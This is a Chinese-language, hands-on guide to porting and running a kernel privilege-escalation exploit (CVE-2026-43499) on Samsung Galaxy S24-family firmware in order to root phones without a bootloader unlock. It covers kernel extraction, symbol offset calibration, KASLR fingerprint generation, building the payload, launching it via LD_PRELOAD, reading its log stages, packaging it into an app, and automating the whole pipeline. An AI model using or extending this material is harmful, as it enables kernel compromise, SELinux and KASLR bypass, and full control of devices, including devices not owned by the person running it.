# 固件适配完整指南（手把手）

> 目标读者：拿到一台**尚未支持**的三星 S24 系列（或同族）设备、想把免解锁 root 做出来的人。
> 照着本文从零做到"能在自己机器上 root 成功"，并且知道**每一步的判据**（哪一行日志代表成功、哪一行代表偏移错了）。
>
> 配套阅读：`ADAPTATION_GUIDE.md`（DZF2 那代的逐坑原始记录）、`ADAPTATION_PLAYBOOK.md`（跨代归纳）、`KSUD_UPGRADE.md`（KernelSU 驱动升级）。

---

## 0. 先搞清楚"适配"到底在做什么

这个 exploit（CVE-2026-43499）依赖**内核镜像里若干符号的位置**。这些位置随**内核构建**变化，所以：

> **载荷是为"某个内核镜像"编译的，不是为"某个机型"编译的。**

由此推出三条铁律（**先读完再动手**）：

| 铁律 | 说明 | 反例 |
| --- | --- | --- |
| **按内核构建定标** | 同一构建号的内核 → 同一套偏移 | 同为 DZF2，国行 `kmalloc_caches=0x0176cbb8`、港版 `0x0176c6f8` |
| **S24 全系同构建通用** | S9210 / S9260 / S9280（e1q/e2q/e3q）**同一构建号可跨机型使用** | 云端实测：S9280 与 S9210 的 DZH3 都能用国行 DZF2 载荷 |
| **国行 ↔ 外版不通用** | 只分「国行」「外版」两套；**港台与欧美外版之间可互串** | 外版 S928B 套国行载荷 → 失败 |

**先判断你属于哪种情况**（这决定工作量）：

| 路径 | 条件 | 工作量 |
| --- | --- | --- |
| **A. 直接可用** | 你的构建号已在支持列表 | 0 |
| **B. 相邻移植** | 同 KMI（如都是 `android14-6.1`）+ 内核版本接近（如 6.1.145 vs 6.1.157） | 半天～1 天：核对几个关键偏移 + 真机验证 |
| **C. 完整定标** | 新 KMI，或偏移差异大 | 1～3 天：走完全流程 |

判断依据：**内核完整版本串**（`6.1.145-android14-11-3254743-abS9280ZCS6DZH3`）。

---

## 1. 前置条件

### 1.1 工具（Debian/Ubuntu 上）

```sh
# 系统包
sudo apt install -y git python3 python3-pip lz4 perl curl jq llvm

# 工作仓库（自包含：源码 + Makefile + 指纹工具）
git clone https://github.com/BuSung-dev/Root-My-Galaxy-Payloads
cd Root-My-Galaxy-Payloads
# LLVM 工具（nm/objdump，用于符号定位与反汇编）
sudo apt install -y llvm
```

| 工具 | 用途 | 获取方式 |
| --- | --- | --- |
| **payload 工程（自包含）** | exploit 源码 + Makefile + 指纹工具 | `git clone https://github.com/BuSung-dev/Root-My-Galaxy-Payloads` |
| **Android NDK r29** | 编译 payload | 官方 zip，解压后设 `ANDROID_NDK_HOME` |
| **vmlinux-to-elf** | **把无符号内核恢复成带符号 ELF**（最关键的一步） | `pip install vmlinux-to-elf` |
| **magiskboot** | 拆 boot 分区 | [Magisk releases](https://github.com/topjohnwu/Magisk/releases) 里的 `magiskboot` |
| `llvm-nm` / `llvm-objdump` | 符号定位 / 反汇编 | `apt install llvm` |

> **工作环境就是 RMG 仓库本身**——它自带 `src/*.c`（exploit 源码）、`src/targets/<target>/`（各目标定标）、
> `Makefile`（构建，含 104128 B 尺寸约束）与 `tools/generate_p0_fingerprint.pl`。
> 下面的命令都以该仓库根目录为当前目录；`<target>` 指 `机型代号-构建串`，例如 `e3q-S9280ZCS6DZH3`。

### 1.2 硬件与账号

- 一台**目标机型**（验证必须真机；模拟器无用）
- 设备开启**开发者选项 → USB 调试**，`adb devices` 能看到
- 能下载到该固件的 **AP 包**（SamFW / samloader / Frija 等）

> 验证阶段**不需要 App、不需要 KernelSU**：payload 以 `LD_PRELOAD` 方式在 shell 域（uid 2000）直接跑，成功与否看日志。

---

## 2. 步骤 1：情报收集

在设备上读这些值（`adb shell getprop <name>`）：

```sh
adb shell getprop ro.product.model            # SM-S9280
adb shell getprop ro.product.device           # e3q ← 机型代号，决定 target 目录名
adb shell getprop ro.build.version.incremental # S9280ZCS6DZH3 ← 构建串
adb shell getprop ro.bootloader               # S9280ZCS6DZH3
adb shell getprop ro.build.version.release    # 16
adb shell getprop ro.build.version.security_patch
adb shell cat /proc/version                   # 内核完整版本 ← 最关键
```

`/proc/version` 的输出形如：

```
Linux version 6.1.145-android14-11-3254743-abS9280ZCS6DZH3 (build-user@build-host) ...
             └──┬──┘ └────┬────┘ └──┬──┘ └────────┬────────┘
           内核版本      KMI      构建号        vermagic 后缀
```

**记录成一张表**（后面填 target.h 和文档都要用）：

| 项 | 值 |
| --- | --- |
| 机型 / 代号 | SM-S9280 / e3q |
| 构建串 | S9280ZCS6DZH3 |
| 内核版本 | 6.1.145 |
| KMI | android14-6.1 |
| 构建号 | 3254743 |
| 地区分支 | 国行（构建串中间段 `ZCS`）/ 外版（`ZHS`/`XXS`/`USQ`…） |

> **地区分支怎么判**：构建串第 4~6 位，`ZCS`/`ZCU` 开头=国行，其余为外版。国行与外版不通用，**先确认你属于哪一支**，别拿错分支的载荷试。

**然后查现有支持列表**（RMG 仓库 `support/targets-v3.json`）：如果已有同构建号 → 直接用，收工。否则进入下一步。

---

## 3. 步骤 2：取内核镜像

### 3.1 解出 boot

AP 包是**双压缩的 tar**（外层 tar + 内层 LZ4 成员），按条目偏移提取最稳：

```sh
# 1) 解开外层，得到一堆 .lz4 成员
tar --lz4 -xvf AP_S9280ZCS6DZH3_*.tar.md5 boot.img.lz4 2>/dev/null || \
  (mkdir -p ap && cd ap && tar -xf ../AP_S9280ZCS6DZH3_*.tar.md5 boot.img.lz4)

# 2) 解 LZ4 得到 boot.img
lz4 -d boot.img.lz4 boot.img

# 3) 用 magiskboot 拆出内核
magiskboot unpack boot.img
ls -la kernel        # ← 这就是内核，但通常还是 LZ4 压缩的
```

> 如果 `kernel` 开头不是 `\x7fELF`，再压一层：
> ```sh
> file kernel && lz4 -d kernel kernel.raw    # 视情况可能是 gzip
> ```

### 3.2 判据

```sh
strings -a kernel.raw | head -1        # 应含 "Linux version 6.1.145-android14-11-..."
stat -c%s kernel.raw                   # S24 DZF2 约 38,005,248 字节（可作参考）
```

---

## 4. 步骤 3：恢复带符号的 ELF（**最关键一步**）

**没有符号，后面无法定标。** 内核镜像是纯二进制（符号表被剥掉了），要靠 kallsyms 恢复：

```sh
vmlinux-to-elf kernel.raw vmlinux_<build>.elf
```

### 判据

```sh
llvm-nm vmlinux_<build>.elf | wc -l                       # 应为数万条
llvm-nm vmlinux_<build>.elf | grep -E " (kmalloc_caches|init_task|nfnetlink_log)$"
```

必须能查到 `kmalloc_caches`、`init_task`、`nfnetlink_log`。查不到 = 恢复失败，换 `vmlinux-to-elf` 版本或确认镜像是否完整。

---

## 5. 步骤 4：逐符号定标 → `target.h`

### 5.1 需要哪些符号

在 ELF 里查这些符号的**绝对地址**，减掉内核基址 `KIMAGE_TEXT_BASE = 0xffffffc008000000` 得到偏移：

```sh
llvm-nm vmlinux_dzh3.elf | grep -E " (kmalloc_caches|init_task|nfnetlink_log|pipe_fcntl|ashmem_misc_fops)$"
```

| 符号 | 对应宏 | 作用 | 必须核对？ |
| --- | --- | --- | --- |
| `kmalloc_caches` | `KMALLOC_CACHES_OFF` | 管道/页面 oracle 的锚点 | **必须** |
| `nfnetlink_log` | `SLIDE_NFULNL_LOGGER_OFF` | KASLR slide 预判（tracefs 路径） | **必须** |
| `init_task` | `INIT_TASK_OFF` | 找 root task group | **必须** |
| `ashmem_misc_fops` | `ASHMEM_MISC_FOPS_OFF` | CFI fops 劫持目标 | **必须** |
| 内核基址 | `KIMAGE_TEXT_BASE` | 通常不变 | 核对 |
| 物理加载基址 | `P0_KERNEL_PHYS_LOAD` | 0xa8000000 / 0x80080000 | 核对（与机上内存布局相关） |

其余宏（`PIPE_DRAIN_SLABS`、`SLIDE_*`、`MM_STRUCT_SZ`、`SLIDE_WAITER_CORE` 等）是**平台级调参**，同 KMI 基本可直接沿用；`P0_ORACLE_PROBE_OFFSET`（通常 `0x1f0000`）与指纹表配套。

### 5.2 生成新 target.h

**复制最接近的现有目标**，然后只改必须改的宏（在 RMG 仓库根目录）：

```sh
cp -r src/targets/e3q-S9280ZCS6DZF2 src/targets/e3q-S9280ZCS6DZH3
$EDITOR src/targets/e3q-S9280ZCS6DZH3/target.h
```

**一定要改的三处**（漏了会很难排查）：

1. `BUILD_VARIANT_LABEL` → `"e3q-S9280ZCS6DZH3-app-physical-p0-oracle"`（日志里靠它确认跑的是哪套定标）
2. `KMALLOC_CACHES_OFF` / `SLIDE_NFULNL_LOGGER_OFF` / `INIT_TASK_OFF` / `ASHMEM_MISC_FOPS_OFF` → 上一步查到的值
3. `BUILD_FINGERPRINT` → 改成你的指纹串

示例（对照两个目标的差异）：

```c
#define KIMAGE_TEXT_BASE        0xffffffc008000000ULL   // 通常不变
#define KMALLOC_CACHES_OFF      0x0176cbb8ULL           // ← 国行 DZF2；港版是 0x0176c6f8
#define SLIDE_NFULNL_LOGGER_OFF 0x016a61b8ULL           // ← 国行 DZF2；港版 DZE2 是 0x016a61e6
#define INIT_TASK_OFF           0x0224f8c0ULL
#define ASHMEM_MISC_FOPS_OFF    0x023bb5b0ULL
#define P0_ORACLE_PROBE_OFFSET  0x1f0000ULL             // 与指纹表配套
#define P0_KERNEL_PHYS_LOAD     0xa8000000ULL
#define BUILD_VARIANT_LABEL     "e3q-S9280ZCS6DZH3-app-physical-p0-oracle"
```

> 用 `make info` 确认 Makefile 解析到的目标与产物路径：
> ```sh
> ANDROID_NDK_HOME=<ndk> TARGET=e3q-S9280ZCS6DZH3 make info
> ```

---

## 6. 步骤 5：生成 KASLR 指纹表

指纹表让 payload 在**不知道 slide 的情况下**，用 32×8 个 qword 去比对物理页、反推 slide。

```sh
perl tools/generate_p0_fingerprint.pl kernel.raw 0x1f0000 \
     src/targets/e3q-S9280ZCS6DZH3/p0_fingerprint.h
```

- 参数：`<原始内核镜像> <探测偏移（与 P0_ORACLE_PROBE_OFFSET 一致）> <输出头文件>`
- 产物结构：`P0_FINGERPRINT_WORDS 8` + `p0_fingerprint_offsets[]`（32 行）
- **判据**：真机运行时看命中数，理想是 **32/32**；明显偏低说明偏移或镜像不对

---

## 7. 步骤 6：构建

```sh
export ANDROID_NDK_HOME=<ndk-r29>
TARGET=e3q-S9280ZCS6DZH3 make release     # App 用（做了体积优化、去符号）
TARGET=e3q-S9280ZCS6DZH3 make stable      # 真机稳版（额外 -DAPP_S928_STABLE_RACE=1）
```

| 产物 | 用途 | 大小 |
| --- | --- | --- |
| `build/<target>/cve-2026-43499-app.so` | App 资产 / 正常验证 | **固定 104128 B**（Makefile `release` 里 `test ... -le 104128` + `truncate` 保证） |
| `build/<target>/cve-2026-43499-app.stable.so` | 真机稳版（竞态更保守） | 同上 |
| `build/<target>/cve-2026-43499-root` | root helper（su 守护进程） | ~27 KB |

> Makefile 会**校验产物不超过 104128 B 再 `truncate` 补齐**；超了直接编译失败——这是硬约束，别绕。

> **大小是硬约束**：104128 B 是 App 资产的既定尺寸，`truncate` 会补齐/截断。改动代码后如果超限，编译会失败，别绕。

---

## 8. 步骤 7：真机验证（**核心环节**）

### 8.1 推送并运行

```sh
adb push build/<target>/cve-2026-43499-app.so /data/local/tmp/cve-2026-43499
adb push build/<target>/cve-2026-43499-root          /data/local/tmp/
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root

adb shell 'cd /data/local/tmp && \
  EXPLOIT_ATTEMPTS=24 \
  P0_ATTEMPT_TIMEOUT_SEC=45 \
  EXPLOIT_ATTEMPT_TIMEOUT_SEC=120 \
  CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/sh -c true' 2>&1 | tee run.log
```

> `LD_PRELOAD` 让 exploit 以构造器方式在 `sh` 启动时执行 —— 跑在 **uid 2000 / shell 域**（SELinux 宽松），这是拿到 root 的前置条件。

### 8.2 阶段地图：卡在哪一行，对应什么

```
[+] slide-kaslr-ok              ← KASLR slide 已恢复（指纹命中）
[*] fresh physrw pipe page      ← 管道内存准备完成
[*] mm leaked=… object_index=N  ← mm_struct 泄漏成功
[*] sk_buff reclaim sends=16/16 ← SKB 回收完成
[*] kernel page prepare …       ← 拿到可控内核页
[*] app fops slide route …      ← fops 路由已排好
[*] app fops slide attempt=… triggered=… verified=…   ← ★竞态触发与验证
[*] cfi write/read ret=35       ← 任意读写打通
[*] pipe caches … selected=…    ← kmalloc 缓存定位
[*] phys step pipe probe found=1← pipe_buffer 定位
[*] root umh result … socket=1  ← ★ root 成功
[+] exploit completed
[+] pipe physrw … uid=2000->0
```

### 8.3 成功判据（**只看这两行的组合**）

```
[+] exploit completed attempt=N/24
[+] root umh result wake=1 complete=1 retval=0 socket=1
[+] pipe physrw pid=… done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
```

### 8.4 失败分类与对策（依据云端 87 条真实日志的统计）

| 现象 | 含义 | 对策 |
| --- | --- | --- |
| `exploit attempt=N/24 failed status=…`，但每轮都有 `triggered=1 verified=1`？不——只有 `triggered=1` | 竞态触发了，但 **physrw 没建立** | 见下一条 |
| **`triggered=1 verified=0 step=8`** + `pipe physrw … done=0 root=0`，**反复如此** | **这次开机分配器没给出可配对的页**——不是你的载荷错 | **重启，换一次开机再试**（别在这轮开机里耗几十次） |
| `triggered=0` 反复出现 | 竞态没中，概率性 | 重试即可（成功案例的尝试次数实测为 1/1/1/3/11/23） |
| `pipe KernelSnitch sk_buff page leak failed`，30~60 次**完全一样** | P0 泄漏失败 = **偏移不匹配** | 回到步骤 4 核对偏移；确认国行/外版分支没拿错 |
| `slide tracefs pre-oracle unavailable; using physical scan` | tracefs 预判不可用，退回物理扫描 | 成功率下降，属正常路径；若一直不可用查 tracefs 权限 |
| 走到某步后长时间无输出 | 卡住（常见于 `fresh physrw pipe page` 之后） | **重启重试**，不要等 15 分钟超时 |
| `wait_requeue_pi ret=-1 errno=110` | futex 等超时 | 多见于跨族载荷；检查载荷是否真属于你的内核线 |

### 8.5 验证清单（逐项打勾）

- [ ] `slide-kaslr-ok` 出现（指纹命中，最好 32/32）
- [ ] 至少见过一次 `triggered=1 verified=1`
- [ ] 出现过 `exploit completed`
- [ ] 出现过 `retval=0 socket=1` 或 `done=1 root=1`
- [ ] 冷启动后**再跑一次**仍能成功（可重复性）
- [ ] 失败时失败点符合上表分类（不是"偏移不匹配"那一类）

---

## 9. 步骤 8：接入 App（可选，但推荐）

如果只是想给自己用，第 8 步就够了。要让别人也能用，把它接进 App：

### 9.1 放资产

```sh
cp build/e3q-S9280ZCS6DZH3/cve-2026-43499-app.stable.so \
   RootMyS9280/app/src/main/assets/cve-2026-43499-dzh3
```

命名规则：`cve-2026-43499-<短名>`（短名通常是构建号后 4 位小写）。**必须 104128 B**。

### 9.2 加枚举条目

在 `RootViewModel.kt` 的 `FirmwareVersion` 枚举里加一项：

```kotlin
S9280DZH3("cve-2026-43499-dzh3", "One UI 8.5", "S24 全系 · 国行", "DZE2–DZH3",
          Region.CHINA, "ksud-selected"),
```

| 参数 | 规则 |
| --- | --- |
| 资产名 | 与 assets 里的文件名一致 |
| **适配机型** | 写 **「S24 全系 · 国行」/「S24 全系 · 外版」**，不要写具体机型（载荷不按机型定标） |
| **适配范围** | 覆盖的构建码，区间用 `起始–结束`（如 `DZE2–DZH3`）。App 用它做**启动前构建校验**，范围写错会误拦用户 |
| 地区 | `Region.CHINA` / `Region.HONGKONG_TAIWAN` |
| ksud | 按 KMI 选：`6.1→ksud-selected`、`6.6→ksud-android15-6.6`、`5.15→ksud-android13-5.15`、`6.12→ksud-android16-6.12` |
| `tested` | 真机验证过再置 `true`（未验证的默认隐藏，需设置里开启） |

`ksud-selected` 是 **KernelSU v3.2.5 的 Samsung kdp 变体**（内嵌 6.1 模块）；换 KMI 时必须换对应 ksud。

---

## 10. 步骤 9：回馈上游（让所有人都能用）

提到 [Root-My-Galaxy-Payloads](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads)：

```
src/targets/<target>/target.h            # 定标
src/targets/<target>/p0_fingerprint.h    # 指纹表
src/targets/<target>/README.md           # 与参考目标的差异说明
artifacts/<target>/cve-2026-43499-app.so # 载荷（104128 B）
support/targets-v3.json                  # 注册条目（payloadId/models/kernelVersions/exploit/kernelsu）
docs/SM-<机型>-<构建>.md                  # 适配记录（证据表 + 内核链 + SHA256）
README.md                                # 支持表加一行
```

PR 里**必须写清**：设备实测证据（成功日志关键行）、与参考目标的偏移差异、覆盖范围。参考已合并的 PR 作为模板。

---

## 11. 排坑速查（前人踩过的，别再踩）

| 坑 | 现象 | 根因与解法 |
| --- | --- | --- |
| **F_SETPIPE_SZ EPERM** | 准备管道时 `EPERM`，24 次全失败 | 前次失败的 **keeper 进程还握着已扩容管道**，把 uid 2000 的页配额占满。先查并杀掉同 uid 残留进程，再怀疑内核 |
| **worklist 孤儿 work** | root 后几分钟随机 panic 重启 | 往共享 worklist 注入伪 work 时撞上真实 work（显示驱动 DSI 常用同一池）。**注入前重查链表仍为空**，被占用就回滚放弃；并**运行期间熄屏** |
| **SELinux 状态反复** | late-load 后 Permissive 又变 Enforcing、su socket 断 | 这是 KernelSU 的正常行为（它恢复 Enforcing），不是故障 |
| **模块 vermagic 不匹配** | `insmod` 报 version magic 错误 | 模块必须与内核 vermagic 同一内核线；ksud 用 rust-embed 把 `bin/aarch64/*_kernelsu.ko` 编进自身，换 KMI 必须换模块 |
| **大小超限** | 编译报错或产物被截断 | App 资产固定 **104128 B**，代码体积要控制 |
| **宏被 `#ifndef` 覆盖** | 改了 target.h 却不生效 | 宏定义顺序/覆盖关系；`BUILD_VARIANT_LABEL` 打印出来核对最直接 |
| **拿错地区分支** | 同构建号却恒失败 | 国行 vs 外版不通用；看构建串中间段（`ZCS`=国行） |

---

## 12. 附录

### A. 全流程一键脚本（改路径即用）

```sh
#!/bin/bash
set -euo pipefail
BUILD=ZCS6DZH3 ; TARGET=e3q-S9280$BUILD ; APK_AP=AP_S9280$BUILD
NDK=${ANDROID_NDK_HOME:?请设置 ANDROID_NDK_HOME}

# 1) 取内核
mkdir -p work && cd work
lz4 -d ../$APK_AP*.tar.md5 2>/dev/null || true
#  （AP 是 LZ4 tar：先按条目提取 boot.img.lz4，这里按你的实际包名调整）
lz4 -d boot.img.lz4 boot.img && magiskboot unpack boot.img
[ -f kernel ] || { echo "未得到 kernel"; exit 1; }
file kernel | grep -q ELF || lz4 -d kernel kernel.raw
[ -f kernel.raw ] || cp kernel kernel.raw

# 2) 恢复符号
vmlinux-to-elf kernel.raw vmlinux_$BUILD.elf
llvm-nm vmlinux_$BUILD.elf | grep -E " (kmalloc_caches|init_task|nfnetlink_log)$" || { echo "符号恢复失败"; exit 1; }

# 3) 定标：核对符号绝对地址（人工填进 target.h）
llvm-nm vmlinux_$BUILD.elf | grep -E " (kmalloc_caches|init_task|nfnetlink_log|ashmem_misc_fops)$"

# 4) 指纹（在 RMG 仓库根目录）
mkdir -p src/targets/$TARGET
perl tools/generate_p0_fingerprint.pl work/kernel.raw 0x1f0000 \
     src/targets/$TARGET/p0_fingerprint.h

# 5) 构建
TARGET=$TARGET ANDROID_NDK_HOME=$NDK make stable
ls -l build/$TARGET/
```

### B. 术语表

| 词 | 含义 |
| --- | --- |
| **KMI** | Kernel Module Interface，如 `android14-6.1`。模块/ksud 按 KMI 分开，不可互换 |
| **vermagic** | 内核版本魔法串，模块加载时校验；必须与目标内核同一线 |
| **slide** | KASLR 偏移；内核每次开机加载地址随机 |
| **P0 / P0 oracle** | 第一步物理页泄漏，用来拿到内核物理基址 |
| **physrw** | 物理读写原语；root 阶段靠它改写当前任务 uid |
| **kdp** | Samsung KDP/RKP/DEFEX 相关变体；模块需做成 no-patch-text 才能在这些机型上加载 |
| **stage 阶段地图** | 日志里 `[+] / [*]` 各里程碑，用来定位卡点 |

### C. 现有目标参考（直接抄差异）

| target | 机型 | 内核 | 备注 |
| --- | --- | --- | --- |
| `e3q-S9280ZCS6DZF2` | S9280 国行 | 6.1.145 | **基线**，坑最全 |
| `e3q-S9280ZCS6DZG1` | S9280 国行 | 6.1.145 | 并入 DZF2 载荷 |
| `e3q-S9280ZHS4CZA1` | S9280 港台 | 6.1.128 | 与国行 CZA1 数据段差 +0x10000 |
| `e3q-S9280ZCS4CZA1` | S9280 国行 | 6.1.128 | 定标完成、P0 泄漏仍有问题 |
| `e3q-S9280ZHS6DZE2` | S9280 港台 | 6.1.145 | 港台共用 |
| `e1q-S9210ZCU4BYH7` | S9210 国行 | 6.1.99 | One UI 7 |
| `S9310ZCSCCZG1` | S25 国行 | 6.6.98 | `struct page` slab_cache 偏移 0x08；KSU 用 6.6 模块 |

### D. 还没人做、欢迎认领的目标

- **S9280/S9210 国行 DZH3**（6.1.145）：目前靠 DZF2 载荷"运气可用"，**缺独立定标**
- **外版 S9260 CZC1**（6.1.128）：完全无载荷
- 其他你手上有的构建

---

## 结语

适配的本质是两件事：**符号定标**（靠 vmlinux-to-elf + 逐项对比）和**环境排坑**（靠取证 → 定位 → 修复）。
定标做对，链路自然通；排坑做扎实，失败时你能一眼说出卡在哪一步、下一步该做什么——而不是"再试几次看看"。

遇到问题请带上**完整运行日志**：里面已含机型、固件、内核与每个阶段的输出，比描述有用得多。
